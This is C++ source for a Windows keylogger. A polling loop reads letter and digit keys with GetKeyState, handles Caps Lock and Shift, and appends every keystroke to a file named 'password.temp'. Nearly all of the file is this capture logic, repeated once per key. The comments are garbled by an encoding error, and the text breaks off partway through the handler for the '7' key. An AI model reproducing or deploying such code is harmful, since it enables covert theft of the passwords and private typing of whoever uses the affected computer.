
#include<iostream>  
#include<windows.h>  
#include<stdlib.h>

using namespace std;



int main(void)
{
	short downa = 0;
	long int a = -32767;
	short downb = 0;
	long int b = -32737;
	short downc = 0;
	long int c = -32737;
	short downd = 0;
	long int d = -32737;
	short downe = 0;
	long int e = -32737;
	short downf = 0;
	long int f = -32737;
	short downg = 0;
	long int g = -32737;
	short downh = 0;
	long int h = -32737;
	short downi = 0;
	long int i = -32737;
	short downj = 0;
	long int j = -32737;
	short downk = 0;
	long int k = -32737;
	short downl = 0;
	long int l = -32737;
	short downn = 0;
	long int n = -32737;
	short downm = 0;
	long int m = -32737;
	short downo = 0;
	long int o = -32737;
	short downp = 0;
	long int p = -32737;
	short downq = 0;
	long int q = -32737;
	short downr = 0;
	long int r = -32737;
	short downs = 0;
	long int s = -32737;
	short downt = 0;
	long int t = -32737;
	short downu = 0;
	long int u = -32737;
	short downv = 0;
	long int v = -32737;
	short downw = 0;
	long int w = -32737;
	short downx = 0;
	long int x = -32737;
	short downy = 0;
	long int y = -32737;
	short downz = 0;
	long int z = -32737;
	short down0 = 0;
	long int zero = -32737;
	short down1 = 0;
	long int one = -32737;
	short down2 = 0;
	long int two = -32737;
	short down3 = 0;
	long int three = -32737;
	short down4 = 0;
	long int four = -32737;
	short down5 = 0;
	long int five = -32737;
	short down6 = 0;
	long int six = -32737;
	short down7 = 0;
	long int seven = -32737;
	short down8 = 0;
	long int eight = -32737;
	short down9 = 0;
	long int nine = -32737;
	short downZERO = 0;
	long int ZEROO = -32737;
	short downONE = 0;
	long int ONEE = -32737;
	short downTWO = 0;
	long int TWOO = -32737;
	short downTHREE = 0;
	long int THREEE = -32737;
	short downFOUR = 0;
	long int FOURR = -32737;
	short downFIVE = 0;
	long int FIVEE = -32737;
	short downSIX = 0;
	long int SIXX = -32737;
	short downSEVEN = 0;
	long int SEVENN = -32737;
	short downEIGHT = 0;
	long int EIGHTT = -32737;
	short downNINE = 0;
	long int NINEE = -32737;
	while (1)
	{

		downa = GetKeyState('A');//��ȡ�¼�ͷ��״̬   ���down>0 ��ʾ���ɿ�  down<0 ��ʾ������
		{
			if (downa == a)      //����¼�ͷ��������   
			{
				if (GetKeyState(VK_CAPITAL))
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "A\n");
					fclose(fp);
					a = 5000000;
				}
				else
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "a\n");
					fclose(fp);
					a = 5000000;
				}
			}
			else if (downa == 0)
			{
				a = -32767;
			}
		}

		downb = GetKeyState('B');//��ȡ�¼�ͷ��״̬   ���down>0 ��ʾ���ɿ�  down<0 ��ʾ������
		{
			if (downb == b)      //����¼�ͷ��������   
			{
				if (GetKeyState(VK_CAPITAL))
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "B\n");
					fclose(fp);
					b = 5000000;
				}
				else
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "b\n");
					fclose(fp);
					b = 5000000;
				}
			}
			else if (downb == 0)
			{
				b = -32767;
			}
		}

		downc = GetKeyState('C');//��ȡ�¼�ͷ��״̬   ���down>0 ��ʾ���ɿ�  down<0 ��ʾ������
		{
			if (downc == c)      //����¼�ͷ��������   
			{
				if (GetKeyState(VK_CAPITAL))
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "C\n");
					fclose(fp);
					c = 5000000;
				}
				else
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "c\n");
					fclose(fp);
					c = 5000000;
				}
			}
			else if (downc == 0)
			{
				c = -32767;
			}
		}

		downd = GetKeyState('D');//��ȡ�¼�ͷ��״̬   ���down>0 ��ʾ���ɿ�  down<0 ��ʾ������
		{
			if (downd == d)      //����¼�ͷ��������   
			{
				if (GetKeyState(VK_CAPITAL))
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "D\n");
					fclose(fp);
					d = 5000000;
				}
				else
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "d\n");
					fclose(fp);
					d = 5000000;
				}
			}
			else if (downd == 0)
			{
				d = -32767;
			}
		}

		downe = GetKeyState('E');//��ȡ�¼�ͷ��״̬   ���down>0 ��ʾ���ɿ�  down<0 ��ʾ������
		{
			if (downe == e)      //����¼�ͷ��������   
			{
				if (GetKeyState(VK_CAPITAL))
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "E\n");
					fclose(fp);
					e = 5000000;
				}
				else
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "e\n");
					fclose(fp);
					e = 5000000;
				}
			}
			else if (downe == 0)
			{
				e = -32767;
			}
		}

		downf = GetKeyState('F');//��ȡ�¼�ͷ��״̬   ���down>0 ��ʾ���ɿ�  down<0 ��ʾ������
		{
			if (downf == f)      //����¼�ͷ��������   
			{
				if (GetKeyState(VK_CAPITAL))
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "F\n");
					fclose(fp);
					f = 5000000;
				}
				else
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "f\n");
					fclose(fp);
					f = 5000000;
				}
			}
			else if (downf == 0)
			{
				f = -32767;
			}
		}

		downg = GetKeyState('G');//��ȡ�¼�ͷ��״̬   ���down>0 ��ʾ���ɿ�  down<0 ��ʾ������
		{
			if (downg == g)      //����¼�ͷ��������   
			{
				if (GetKeyState(VK_CAPITAL))
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "G\n");
					fclose(fp);
					g = 5000000;
				}
				else
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "g\n");
					fclose(fp);
					g = 5000000;
				}
			}
			else if (downg == 0)
			{
				g = -32767;
			}
		}

		downh = GetKeyState('H');//��ȡ�¼�ͷ��״̬   ���down>0 ��ʾ���ɿ�  down<0 ��ʾ������
		{
			if (downh == h)      //����¼�ͷ��������   
			{
				if (GetKeyState(VK_CAPITAL))
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "H\n");
					fclose(fp);
					h = 5000000;
				}
				else
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "h\n");
					fclose(fp);
					h = 5000000;
				}
			}
			else if (downh == 0)
			{
				h = -32767;
			}
		}

		downi = GetKeyState('I');//��ȡ�¼�ͷ��״̬   ���down>0 ��ʾ���ɿ�  down<0 ��ʾ������
		{
			if (downi == i)      //����¼�ͷ��������   
			{
				if (GetKeyState(VK_CAPITAL))
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "I\n");
					fclose(fp);
					i = 5000000;
				}
				else
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "i\n");
					fclose(fp);
					i = 5000000;
				}
			}
			else if (downi == 0)
			{
				i = -32767;
			}
		}

		downj = GetKeyState('J');//��ȡ�¼�ͷ��״̬   ���down>0 ��ʾ���ɿ�  down<0 ��ʾ������
		{
			if (downj == j)      //����¼�ͷ��������   
			{
				if (GetKeyState(VK_CAPITAL))
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "J\n");
					fclose(fp);
					j = 5000000;
				}
				else
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "j\n");
					fclose(fp);
					j = 5000000;
				}
			}
			else if (downj == 0)
			{
				j = -32767;
			}
		}

		downk = GetKeyState('K');//��ȡ�¼�ͷ��״̬   ���down>0 ��ʾ���ɿ�  down<0 ��ʾ������
		{
			if (downk == k)      //����¼�ͷ��������   
			{
				if (GetKeyState(VK_CAPITAL))
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "K\n");
					fclose(fp);
					k = 5000000;
				}
				else
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "k\n");
					fclose(fp);
					k = 5000000;
				}
			}
			else if (downk == 0)
			{
				k = -32767;
			}
		}

		downl = GetKeyState('L');//��ȡ�¼�ͷ��״̬   ���down>0 ��ʾ���ɿ�  down<0 ��ʾ������
		{
			if (downl == l)      //����¼�ͷ��������   
			{
				if (GetKeyState(VK_CAPITAL))
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "L\n");
					fclose(fp);
					l = 5000000;
				}
				else
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "l\n");
					fclose(fp);
					l = 5000000;
				}
			}
			else if (downl == 0)
			{
				l = -32767;
			}
		}

		downn = GetKeyState('N');//��ȡ�¼�ͷ��״̬   ���down>0 ��ʾ���ɿ�  down<0 ��ʾ������
		{
			if (downn == n)      //����¼�ͷ��������   
			{
				if (GetKeyState(VK_CAPITAL))
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "N\n");
					fclose(fp);
					n = 5000000;
				}
				else
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "n\n");
					fclose(fp);
					n = 5000000;
				}
			}
			else if (downn == 0)
			{
				n = -32767;
			}
		}

		downm = GetKeyState('M');//��ȡ�¼�ͷ��״̬   ���down>0 ��ʾ���ɿ�  down<0 ��ʾ������
		{
			if (downm == m)      //����¼�ͷ��������   
			{
				if (GetKeyState(VK_CAPITAL))
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "M\n");
					fclose(fp);
					m = 5000000;
				}
				else
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "m\n");
					fclose(fp);
					m = 5000000;
				}
			}
			else if (downm == 0)
			{
				m = -32767;
			}
		}

		downo = GetKeyState('O');//��ȡ�¼�ͷ��״̬   ���down>0 ��ʾ���ɿ�  down<0 ��ʾ������
		{
			if (downo == o)      //����¼�ͷ��������   
			{
				if (GetKeyState(VK_CAPITAL))
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "O\n");
					fclose(fp);
					o = 5000000;
				}
				else
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "o\n");
					fclose(fp);
					o = 5000000;
				}
			}
			else if (downo == 0)
			{
				o = -32767;
			}
		}

		downp = GetKeyState('P');//��ȡ�¼�ͷ��״̬   ���down>0 ��ʾ���ɿ�  down<0 ��ʾ������
		{
			if (downp == p)      //����¼�ͷ��������   
			{
				if (GetKeyState(VK_CAPITAL))
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "P\n");
					fclose(fp);
					p = 5000000;
				}
				else
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "p\n");
					fclose(fp);
					p = 5000000;
				}
			}
			else if (downp == 0)
			{
				p = -32767;
			}
		}

		downq = GetKeyState('Q');//��ȡ�¼�ͷ��״̬   ���down>0 ��ʾ���ɿ�  down<0 ��ʾ������
		{
			if (downq == q)      //����¼�ͷ��������   
			{
				if (GetKeyState(VK_CAPITAL))
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "Q\n");
					fclose(fp);
					q = 5000000;
				}
				else
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "q\n");
					fclose(fp);
					q = 5000000;
				}
			}
			else if (downq == 0)
			{
				q = -32767;
			}
		}

		downr = GetKeyState('R');//��ȡ�¼�ͷ��״̬   ���down>0 ��ʾ���ɿ�  down<0 ��ʾ������
		{
			if (downr == r)      //����¼�ͷ��������   
			{
				if (GetKeyState(VK_CAPITAL))
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "R\n");
					fclose(fp);
					r = 5000000;
				}
				else
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "r\n");
					fclose(fp);
					r = 5000000;
				}
			}
			else if (downr == 0)
			{
				r = -32767;
			}
		}

		downs = GetKeyState('S');//��ȡ�¼�ͷ��״̬   ���down>0 ��ʾ���ɿ�  down<0 ��ʾ������
		{
			if (downs == s)      //����¼�ͷ��������   
			{
				if (GetKeyState(VK_CAPITAL))
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "S\n");
					fclose(fp);
					s = 5000000;
				}
				else
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "s\n");
					fclose(fp);
					s = 5000000;
				}
			}
			else if (downs == 0)
			{
				s = -32767;
			}
		}

		downt = GetKeyState('T');//��ȡ�¼�ͷ��״̬   ���down>0 ��ʾ���ɿ�  down<0 ��ʾ������
		{
			if (downt == t)      //����¼�ͷ��������   
			{
				if (GetKeyState(VK_CAPITAL))
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "T\n");
					fclose(fp);
					t = 5000000;
				}
				else
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "t\n");
					fclose(fp);
					t = 5000000;
				}
			}
			else if (downt == 0)
			{
				t = -32767;
			}
		}

		downu = GetKeyState('U');//��ȡ�¼�ͷ��״̬   ���down>0 ��ʾ���ɿ�  down<0 ��ʾ������
		{
			if (downu == u)      //����¼�ͷ��������   
			{
				if (GetKeyState(VK_CAPITAL))
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "U\n");
					fclose(fp);
					u = 5000000;
				}
				else
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "u\n");
					fclose(fp);
					u = 5000000;
				}
			}
			else if (downu == 0)
			{
				u = -32767;
			}
		}

		downv = GetKeyState('V');//��ȡ�¼�ͷ��״̬   ���down>0 ��ʾ���ɿ�  down<0 ��ʾ������
		{
			if (downv == v)      //����¼�ͷ��������   
			{
				if (GetKeyState(VK_CAPITAL))
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "V\n");
					fclose(fp);
					v = 5000000;
				}
				else
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "v\n");
					fclose(fp);
					v = 5000000;
				}
			}
			else if (downv == 0)
			{
				v = -32767;
			}
		}

		downw = GetKeyState('W');//��ȡ�¼�ͷ��״̬   ���down>0 ��ʾ���ɿ�  down<0 ��ʾ������
		{
			if (downw == w)      //����¼�ͷ��������   
			{
				if (GetKeyState(VK_CAPITAL))
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "W\n");
					fclose(fp);
					w = 5000000;
				}
				else
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "w\n");
					fclose(fp);
					w = 5000000;
				}
			}
			else if (downw == 0)
			{
				w = -32767;
			}
		}

		downx = GetKeyState('X');//��ȡ�¼�ͷ��״̬   ���down>0 ��ʾ���ɿ�  down<0 ��ʾ������
		{
			if (downx == x)      //����¼�ͷ��������   
			{
				if (GetKeyState(VK_CAPITAL))
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "X\n");
					fclose(fp);
					x = 5000000;
				}
				else
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "x\n");
					fclose(fp);
					x = 5000000;
				}
			}
			else if (downx == 0)
			{
				x = -32767;
			}
		}

		downy = GetKeyState('Y');//��ȡ�¼�ͷ��״̬   ���down>0 ��ʾ���ɿ�  down<0 ��ʾ������
		{
			if (downy == y)      //����¼�ͷ��������   
			{
				if (GetKeyState(VK_CAPITAL))
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "Y\n");
					fclose(fp);
					y = 5000000;
				}
				else
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "y\n");
					fclose(fp);
					y = 5000000;
				}
			}
			else if (downy == 0)
			{
				y = -32767;
			}
		}

		downz = GetKeyState('Z');//��ȡ�¼�ͷ��״̬   ���down>0 ��ʾ���ɿ�  down<0 ��ʾ������
		{
			if (downz == z)      //����¼�ͷ��������   
			{
				if (GetKeyState(VK_CAPITAL))
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "Z\n");
					fclose(fp);
					z = 5000000;
				}
				else
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "z\n");
					fclose(fp);
					z = 5000000;
				}
			}
			else if (downz == 0)
			{
				z = -32767;
			}
		}

		down0 = GetKeyState('0');//��ȡ�¼�ͷ��״̬   ���down>0 ��ʾ���ɿ�  down<0 ��ʾ������
		{
			if (down0 == zero)      //����¼�ͷ��������   
			{
				if (GetKeyState(VK_SHIFT))
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, ")\n");
					fclose(fp);
					zero = 5000000;
				}
				else
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "0\n");
					fclose(fp);
					zero = 5000000;
				}
			}
			else if (down0 == 0)
			{
				zero = -32767;
			}
		}

		down1 = GetKeyState('1');//��ȡ�¼�ͷ��״̬   ���down>0 ��ʾ���ɿ�  down<0 ��ʾ������
		{
			if (down1 == one)      //����¼�ͷ��������   
			{
				if (GetKeyState(VK_SHIFT))
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "!\n");
					fclose(fp);
					one = 5000000;
				}
				else
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "1\n");
					fclose(fp);
					one = 5000000;
				}
			}
			else if (down1 == 0)
			{
				one = -32767;
			}
		}

		down2 = GetKeyState('2');//��ȡ�¼�ͷ��״̬   ���down>0 ��ʾ���ɿ�  down<0 ��ʾ������
		{
			if (down2 == two)      //����¼�ͷ��������   
			{
				if (GetKeyState(VK_SHIFT))
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "@\n");
					fclose(fp);
					two = 5000000;
				}
				else
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "2\n");
					fclose(fp);
					two = 5000000;
				}
			}
			else if (down2 == 0)
			{
				two = -32767;
			}
		}

		down3 = GetKeyState('3');//��ȡ�¼�ͷ��״̬   ���down>0 ��ʾ���ɿ�  down<0 ��ʾ������
		{
			if (down3 == three)      //����¼�ͷ��������   
			{
				if (GetKeyState(VK_SHIFT))
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "#\n");
					fclose(fp);
					three = 5000000;
				}
				else
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "3\n");
					fclose(fp);
					three = 5000000;
				}
			}
			else if (down3 == 0)
			{
				three = -32767;
			}
		}

		down4 = GetKeyState('4');//��ȡ�¼�ͷ��״̬   ���down>0 ��ʾ���ɿ�  down<0 ��ʾ������
		{
			if (down4 == four)      //����¼�ͷ��������   
			{
				if (GetKeyState(VK_SHIFT))
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "$\n");
					fclose(fp);
					four = 5000000;
				}
				else
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "4\n");
					fclose(fp);
					four = 5000000;
				}
			}
			else if (down4 == 0)
			{
				four = -32767;
			}
		}

		down5 = GetKeyState('5');//��ȡ�¼�ͷ��״̬   ���down>0 ��ʾ���ɿ�  down<0 ��ʾ������
		{
			if (down5 == five)      //����¼�ͷ��������   
			{
				if (GetKeyState(VK_SHIFT))
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "%\n");
					fclose(fp);
					five = 5000000;
				}
				else
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "5\n");
					fclose(fp);
					five = 5000000;
				}
			}
			else if (down5 == 0)
			{
				five = -32767;
			}
		}

		down6 = GetKeyState('6');//��ȡ�¼�ͷ��״̬   ���down>0 ��ʾ���ɿ�  down<0 ��ʾ������
		{
			if (down6 == six)      //����¼�ͷ��������   
			{
				if (GetKeyState(VK_SHIFT))
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "^\n");
					fclose(fp);
					six = 5000000;
				}
				else
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
					err = fopen_s(&fp, "password.temp", "a"); //��return 1 , ��ָ������ļ����ļ�����fp1
					fprintf(fp, "6\n");
					fclose(fp);
					six = 5000000;
				}
			}
			else if (down6 == 0)
			{
				six = -32767;
			}
		}

		down7 = GetKeyState('7');//��ȡ�¼�ͷ��״̬   ���down>0 ��ʾ���ɿ�  down<0 ��ʾ������
		{
			if (down7 == seven)      //����¼�ͷ��������   
			{
				if (GetKeyState(VK_SHIFT))
				{
					FILE *fp = NULL;
					errno_t err;  //�жϴ��ļ����Ƿ���� ���ڷ���1
